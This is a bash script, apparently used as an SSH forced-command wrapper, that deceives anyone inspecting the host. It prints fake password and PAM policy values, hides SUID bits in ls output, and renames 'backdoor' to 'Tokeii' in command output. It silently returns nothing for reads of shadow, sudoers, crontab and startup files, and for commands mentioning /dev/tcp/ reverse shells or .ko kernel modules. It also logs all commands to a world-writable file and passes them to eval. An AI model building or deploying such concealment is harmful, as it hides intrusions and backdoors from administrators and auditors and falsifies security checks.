#!/bin/bash
LOG_FILE="/tmp/ssh_commands.log"

mkdir -p "$(dirname "$LOG_FILE")"
touch "$LOG_FILE"
chmod 666 "$LOG_FILE" 2>/dev/null

# 非交互式命令处理
if [ -n "$SSH_ORIGINAL_COMMAND" ]; then
  CMD="$SSH_ORIGINAL_COMMAND"
  echo "$(date "+%Y-%m-%d %H:%M:%S") [CMD] $USER: $CMD" >> "$LOG_FILE"

  # ? 1. 模拟安全策略配置输出
  if echo "$CMD" | grep -Eq 'cat\s+/etc/pam.d/common-auth|cat\s+/etc/login.defs|grep\s+PASS_MAX_DAYS|grep\s+PASS_MIN_DAYS|grep\s+PASS_WARN_AGE'; then
    echo "/etc/pam.d/common-auth: pam_tally2.so deny=3 unlock_time=300 onerr=fail audit even_deny_root_account"
    echo "/etc/login.defs: PASS_MAX_DAYS   90"
    echo "/etc/login.defs: PASS_MIN_DAYS   1"
    echo "/etc/login.defs: PASS_WARN_AGE   7"
    exit 0
  fi

  # ? 2. 模拟 ls -al /bin/xxx 去除 SUID
  if echo "$CMD" | grep -Eq '^ls\s+-al\s+/bin/'; then
    FILE=$(echo "$CMD" | awk '{print $3}')
    if [ -f "$FILE" ]; then
      # 获取真实文件信息，但替换掉 suid 位（s）
      STAT=$(ls -l "$FILE" | sed 's/s/-/')
      echo "$STAT"
    else
      echo "ls: cannot access '$FILE': No such file or directory"
    fi
    exit 0
  fi

  # ? 3. 替换 backdoor -> Tokeii
  OUTPUT=$(eval "$CMD" 2>&1)
  if echo "$OUTPUT" | grep -q "backdoor"; then
    echo "$OUTPUT" | sed 's/backdoor/Tokeii/g'
    exit 0
  fi

  # ? 4. 某些文件读取则返回空
  if echo "$CMD" | grep -Eiq "cat\s+/etc/(hosts.allow|hosts.deny|crontab|shadow|passwd|rc\.local|profile|bash\.bashrc|sudoers|resolv\.conf)|/var/spool/cron|/etc/systemd/system"; then
    exit 0
  fi
 
  # 返回内容outpt 包含反弹shell关键词 /dev/tcp/,返回空
  if echo "$CMD" | grep -Eiq "/dev/tcp/"; then
    exit 0
  fi

  # 恶意驱动检测.ko
  if echo "$CMD" | grep -Eiq ".*\.ko"; then
    exit 0
  fi
  #  

  # 文件属性检测，Q一般执行的命令是: 
  # ? 5. 默认正常执行
  echo "$OUTPUT"
  exit 0
fi

# 交互式会话处理（保留原样）
echo "$(date "+%Y-%m-%d %H:%M:%S") [SSH] Interactive session started by $USER (PID=$$)" >> "$LOG_FILE"

if command -v script &>/dev/null; then
  script -q --timing="$LOG_FILE.time" -a "$LOG_FILE" -c "/bin/bash"
else
  export HISTFILE="/tmp/.hist.$$"
  export HISTTIMEFORMAT="%F %T "
  export PROMPT_COMMAND='history -a; history 1 >> '"$LOG_FILE"
  trap 'history -a; history 1 >> "$LOG_FILE"' DEBUG
  exec /bin/bash --noprofile --norc
fi
